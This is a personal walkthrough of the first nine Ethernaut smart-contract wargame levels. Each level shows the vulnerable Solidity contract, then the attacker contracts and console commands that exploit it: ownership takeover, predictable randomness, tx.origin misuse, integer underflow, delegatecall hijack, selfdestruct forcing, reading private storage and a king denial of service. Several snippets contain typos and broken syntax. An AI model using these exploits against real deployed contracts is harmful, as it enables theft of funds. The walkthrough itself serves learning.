# Ethernaut Game

👩‍🚀 I'm completing [The Ethernaut](https://ethernaut.openzeppelin.com/) Game! 

----

Sections:
 - [Prerequisites](#prerequisites)
 - [Fallback](#1-fallback)
 - [Fallout](#2-fallout)
 - [Coin Flip](#3-coin-flip)
 - [Telephone](#4-telephone)
 - [Token](#5-token)
 - [Delegation](#6-delegation)
 - [Force](#7-force)
 - [Valut](#8-valut)
 - [King](#9-king)

----

## Getting Started 

To play the Ethernaut Game there are some steps to do at each level. Here are the Prerequisites and the Steps to setup the levels. 

#### Tools & Prerequisites:
1. [MetaMask](https://metamask.io/) Wallet
2. Rinkeby Testnet ETH: You can get some from the [Rinkeby](https://rinkebyfaucet.com/) or [Paradigm](https://faucet.paradigm.xyz/) faucets. 
3. Console on Google Developer Tools 
4. [Remix](https://remix.ethereum.org/): Online Ethereum IDE

#### Steps:
1. Connect your wallet to the Ethernaut website. 

2. On each challenge you'll need to click "Get a New Instance." You'll need to approve the popup on your MetaMask and pay a transaction fee.  This button will deploy a smart contract. 

* You will not become the owner of the smart contract, instead an Ethernout account will. 
![Screen Shot 2022-07-11 at 22.18.36.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1657567121788/Ni6cwn58e.png align="left")

3. Open the Google Developer Tools Console. This is how to interact with the smart contract. 

4. On some challenges you'll need to deploy a smart contract. You can deploy one on [Remix](https://remix.ethereum.org/) without any additional setup. On Remix select "Injected web3" when deploying the smart contract to deploy from your Metamask. 
 
---

### 1. Fallback

> You will beat this level if
1. you claim ownership of the contract
2. you reduce its balance to 0

The goal of the challenge is to claim ownership of the smart contract and then drain the funds out. There is the "onlyOwner" modifier which is used on the withdraw() function that will allow us to withdraw the funds if we're the owner. 

First lets understand some terms that will be helpful for this challenge and then have a look at the code:
- Smart contracts have their own addresses and can receive money. Just like a user wallet address. 
- A [fallback function](https://www.geeksforgeeks.org/solidity-fall-back-function/) on a solidity smart contract is a function that has no name, is public and can not have any parameters. Its executed when there is a function identifier doesn't exists or the parameters are not specified for a certain function. It basically the goes to the fallback function. The fallback function was mainly used to get money into the smart contract, however the suggested way for a smart contract to receive money today is via the receive function. 
- [Solidity modifiers](https://docs.soliditylang.org/en/v0.8.13/contracts.html#function-modifiers) are used to check a condition before executing a function. The onlyOwner modifier is a frequently used modifier for functions that only the owner of the contract should be able to execute, such as for withdrawing funds from a contract. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; // specify the version of solidity for the compiler 

import '@openzeppelin/contracts/math/SafeMath.sol';
// this is the library to perform mathematical operations safely. 

contract Fallback {

  using SafeMath for uint256;

  // keep track of the addresses and the relative contributions 
  mapping(address => uint) public contributions; 

  // keep the owner address of the smart contract
  // address type is a solidity variable 
  address payable public owner; 

  // constructor is only called once when the contract is deployed 
  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  // modifiers are added to functions, if the condition is satisfied the func is executed 
  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  // get the amount a user has sent to the smart contract and store it in the mapping 
  function contribute() public payable {
    // a require statement checks for a condition and if satisfied moves to the next line 
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  // get the contribution of a certain user 
  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  // get the money out of the smart contract
  // only the owner can execute this function 
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  // this is the fallback function which has no name and executed when no other 
  // function matches 
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
``` 

Important to note that even though we are clicking the button to xx the smart contract it is an Etheranout account thats deploying the smart contract, we are only initiating the transaction. 

#### Solution: 
1. When you open the console, you can have a look at the contract. 
 - check the owner
 - your account address (the player)
 - contributions mapping. 
 
 In order to call the withdraw function there are two conditions:
 - msg.value > 0 --> meaning that the value you send in must be larger than 1
 - contributions[msg.sender] > 0 --> you are in the contributions mapping. Lets satisfy these two conditions 
2. Contribute to the smart contact by calling the contribute() function. 
3. Check the contributions mapping, you should see yourself on there 
4. Now we want to call the fallback function with a value greater than 0. If we satisfy the two conditions then we will be the owner of the function. 
5. Once you are the owner, call the withdraw() function to get the funds out of the smart contract. 

---

### 2. Fallout

> Goal: Claim ownership of the contract below to complete this level.

Let's have a look at the smart contract. I have only added the section that we will be needing to solve the challenge. 

```
contract Fallout {

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

}
``` 
In the above code snippet we have a contract called Fallout and a method that seems to be a constructor. 

A [constructor](https://docs.soliditylang.org/en/v0.8.13/contracts.html#constructor) is a function that is executed when the contract is deployed. It is only executed once and is an optional function. A constructor uses the keyword "constructor" or the name of the smart contract.

#### Solution: 
In the code above there is a function called "Fal1out" which looks like a constructor but actually is not. There is a typo in the name and instead of an "l" there is a "1." So, we are able to call the function, which will transfer the ownership of the smart contract.  

---

### 3. Coin Flip

> This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

We need to know the correct dice result 10 times in a row in order to complete the challenge.

This challenge is about showing that a blockchain is a deterministic system and you can not randomness and we're going to understand why. You don't want to code a random number generator in your smart contract and we'll show why. If you want to introduce randomness you'd want to this via a randomness oracle. 

Let's first cover some key terms and check the smart contract which will be helpful for crafting the solution. 
Key terms
- Randomness on a blockchain:
- Oracle 
- [Blockhash()](https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html): its a global function in solidity that returns the hash of a given block. 
- Block.number: global variable that returns the current block number

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256; // all integers should use the SafeMath Library 
  uint256 public consecutiveWins; // the frontend can get access to this  

  // used for determining randomness
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  // takes a bool thats the guess of the user 
  // returns a bool thats true if guess is correct, false otherwise
  function flip(bool _guess) public returns (bool) {

    // given block, returns the hash 
    // subtract 1 from the block.number because otherwise it returns the current block 
    // which has not been mined yet since the block is not mined it will not have a hash. 
    uint256 blockValue = uint256(blockhash(block.number.sub(1))); 

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue; // save the blockValue as the lastHash 
    uint256 coinFlip = blockValue.div(FACTOR); // integer division with a constant number 
    bool side = coinFlip == 1 ? true : false; // decide on the side based on the number 

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
``` 

The security vulnerability is in the flip function. The random number is being generated based on the blockhash of the previously mined block.  This can be copied by another contract to make the same calculation and then that contract can call the flip() function with the correct result. 

#### Solution: 
1. Copy and paste the smart contract to Remix. 
2. Create a new smart contract on Remix, this will be the attacker smart contract.
3. Here's the code for the guesser contract. I have added comments to explain whats going on. 
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;

 import './CoinFlip.sol'

 contract CoinFlipGuesser {

   CoinFlip public victimContract;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

   constructor(accress _victimContractAddress) public {
       // get the victim contract 
       victimContract = CoinFlip(_victimContractAddress)
   }

   // Use the same logic in the coinFlip function to get the same result
   // call the flip function on the victim contract with the correct result 
   function flip(bool _guess) public returns (bool) {
     uint256 blockValue = uint256(blockhash(block.number.sub(1)));
     uint256 coinFlip = blockValue.div(FACTOR);
     bool side = coinFlip == 1 ? true : false;
     victimContract.flip(side)

    }
 }
 ``` 
4. Get the coinflip address from Ethernaout. 
5. On remix use the coinflip contract address to deploy the Guesser contract. 
6. Execute the flip function on the malicious contract. This will flip a coin but with the result thats pre-calculated, so it should be the correct guess. 
7. Run the command on the google developer tools. It should be incremented. 
```
await contract.consecutiveWins()
``` 
When you flip the coin correctly 10 times you'll complete the challenge. 

---

### 4. Telephone

> Claim ownership of the contract below to complete this level.

The goal of the challenge is to become the owner of the contract. 

In order to hack it here are some helpful terms:
- tx.origin: sender of the transaction (full call chain), this is the original external account (EOA). Only an EOA can initiate a transaction.  
- msg.sender: immediate account (can be a smart contract account or an externally owned account)

The part of the smart contract that we are interested in is the changeOwner(address _owner) function. 

```
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }

``` 

Checkout the contract
contract
contract.abi
await contract.owner() --> look at who the owner is

Bottom line: do no use tx.origin for authorization. makes the smart contract vulnerable to a phising attack. The attacker can trick someone into starting the transaction. 

#### Solution: 
1. Create a new smart contract on Remix. Deploy the telephone contract.;
2. create new telephoneHack solidity file. 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Telephone.sol';

contract TelephoneHack {

  Telephone telephoneContract;

  constructor(address _address) public {
    telephoneContract = Telephone(_address);
  }

  function hackContract(address _address) public {
    telephoneContract.changeOwner(_address);
  }
}
``` 
3. get the contract.address
4. deploy with the contract.address 
5. await contract.owner()
6. execute hackContract() with your address 
7. await contract.owner()

*basically we made a transaction from the smart contract as the tx.origin. 
---

### 5. Token 

> You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

This challenge will show arithmetic underflow and overflows. It's important to use the correct mathematical operations so that you're not vulnerable to this type of attack. 

Let's start by covering some terms and looking at the smart contract.
- Odometer: shows you how many miles you have travelled. 
(ADD IMAGES)
- Arithmetic Overflow: Adding an additional number to the current space.
- Arithmetic Underflow 
- Uint: unsigned integer 256. 
- SafeMath Library: its the safe way to perform aritmetic operations that prevents the overflow/underflow errors. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances; // stores the address and how many tokens they have 
  uint public totalSupply; // uint is short for uint256

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply; // deployer has an initial supply 
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // must be satisfied to move forward
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  // read function to get the balance of a certain address
  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner]; 
  }
}
``` 

The vulnerability is in the transfer function, it has to do with performing math operations.

```
contract.abi
await contract.balanceOf()
``` 

#### Solution: 
1. There is a vulnerability in the require statement of the transfer function: 
```
require(balances[msg.sender] - _value >= 0)
``` 
This is always going to be true because we are mapping to unsigned integers. 
2. Use the transfer function to send more tokens than you currently have. This will trigger an arithmetic underflow. 
```
address random_address = "xx"
await contract.balanceOf(player)
contract.transfer(random_address, 21) 
``` 
3. Have a look at how many tokens you have. 
```
await contract.balanceOf(player)
await contract.balanceOf(random_address)
```
As you can see we've got lot more than we started with. 

---

### 6. Delegation 

> The goal of this level is for you to claim ownership of the instance you are given.

First some key terms and then lets dig into the smart contract (there actually are 2 contracts in one file):
- delegatecall:
- Method Ids:
- Fallback methods:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner; 
  }

  // lets you set the owner of the contract 
  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate; // reference the Delegate contract 

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress); // refer to a deployed contract 
    owner = msg.sender; // msg.sender can be a smart contract address or an EOA (externally owned account)
  }

  // function with no name: a fallback function
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data); // bool result from delegatecall
    if (result) {
      this;
    }
  }
}
``` 

We will be interacting with the second smart contract and you can verify that by running the command below. 
```
contract.abi 
``` 
So delegatecall allows you to invoke a function on another smart contract. 

#### Solution: 
1. See who is the owner for the contract: await contract.owner()
2. lets get the  signature to pass into pwn()
var pwnSignature = web3.utils.sha3("pwn()")
3. on our contract lets call the fallback function and pass the signature.
contract.sendTransaction({data: pwnSignature}) 
4. now check the contract owner.
await contract.owner()

---

### 7. Force 

>Some contracts will simply not take your money ¯\_(ツ)_/¯
>The goal of this level is to make the balance of the contract greater than zero.

Smart contract have addresses and are able to send/receive money. There are two type of accounts on Ethereum:
- Smart contract accounts 
- Externally owned accounts (EOA)

In this level, we need to add money into the contract thats an empty smart contract. After you create an instance of the smart contract, here are some steps to learn more about the contract you've deployed:
- contract.abi() --> on the developer console 
- check the smart contract on rinkeby etherscan (contract.address) - you'll see the bytecode for the smart contract. Because the contract is not verified you will not be able to see the code. 
- await getBalance(contract.address)

Let's look at the ways a smart contract can receive money:
1. fallback function 
2. receive function 

You can try to send funds to the smart contract:
```
contract.sendTransaction({value:1})
``` 
Here is the error message that comes up:
ADD_SCREENSHOT 

#### Solution: 
1. On Remix create a new contract. This contract will selfdestruct and before doing so it will send all the funds to our Force contract. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttacker {
  constructor() payable{
  }
  function attack(address _contractAddress){
    selfdestruct(_contractAddress) // before the self destruct it will send the money to the specified smart contract
  }

}
``` 
2. Execute the attack function, and add the Force contract address. 
3. Head back to the Ethernaut page and check the balance on your Force contract. 
```
await getBalance(contract.address)
``` 

**This is way that auditors know about to send funds to a smart contract that does not have the functions to receive any.**

---

### 8. Valut  

> Unlock the vault to pass the level!

We can understand the goal of the challenge better when we have a look at the smart contract for it. It is to set the boolean "locked" to false. 

Here are the key terms and the smart contract. 
- Storage: when a smart contract gets deployed it gets a certain amount of storage. Storage is slipt into slots and the variables are put into slots. Everything is stored in binary.  
- Private variables: private variables can only be accessed within that contracts code. No other contract code can get access to it, but we can read it. Blockchains are not for confidential data.  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  // the password can unlock the lock 
  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
``` 

Don't let the private keyword fool you into thinking that its actually private. 

From the developer tools you can read some data about the contract:

```
contract.abi 
contract
await contract.locked 
contract.address
``` 
You can check the storage space given to the smart contract:
```
web3.eth.getStorageAt(contract_address)
``` 

**Bottom line: Nothing is private on a blockchain, you can encrypt but thats an extra measure added by you. **

#### Solution: 
Since everything is stored on the blockcahin and this is all accessiable the goal is to get the slot where the password is stored. We want to determine that slot and then call the "web3.eth.getStorageAt" function. 

1. decrale a variable pwd
"var pwd"
2. call the getStorageAt function
web3.eth.getStorageAt(contract_address, 0, function(err, result){pwd=result})
--> this will give the locked value. 
now do it for slot value-2 (index 1), which will be the password. 
web3.eth.getStorageAt(contract_address, 1, function(err, result){pwd=result})
--> the result will be in binary representation. 
3. convert binary to assci
web3.utils.toAscii(pwd)
the printed result is the password. 
4. unlock the smart contract
``` 
await contract.locked()
contract.unlock(pwd)
await contract.locked()
``` 
---

### 9. King  

> When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

This hack is about a game called King of ether: https://www.kingoftheether.com

here's how the game is played as explained on the ethernaout site:

> The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

We want to hack the contract so that no one can become king. 

First some key notes and then the contract:

- Now important to note that when you are making a transaction to another smart contract you should have an error handling mechanism. If the smart contract you are making a call to fails than you transaction will not pass. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
``` 

to hack the contract no one should be able to call "king.transfer(msg.value);"

#### Solution: 
1. we'll create a new smart contract on Remix.
2. create a new solidity file attackking.sol 
3. here is how the contract should be, have a look at the comments for whats going on. 
-our contract will become the king, then when someone else wants to become king we are not going to allow them to transfer the ownership 
- we can just not put a fallback function on our contract and then noone can reclaim ownership 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackKing {
  constructor(address _king) public payable {
    address(_king).call.value(msg.value)();
  }

  function() external transfer {
    revert("you loose!");
  }

}
``` 
The transfer function will not work on this smart contract. You shouldn't assume that the smart contract you make a function call to will have its error handling or a fallback function by default. 
4. check the prize value in the contract. we need to put more money than the curent price amaount. 
await contract.prize() // in gwei
await contract._king() // get the current king
5. deploy the malicious smart contract with a larger amount than the prize. 
6. check who is the king 
await contract._king() // get the king

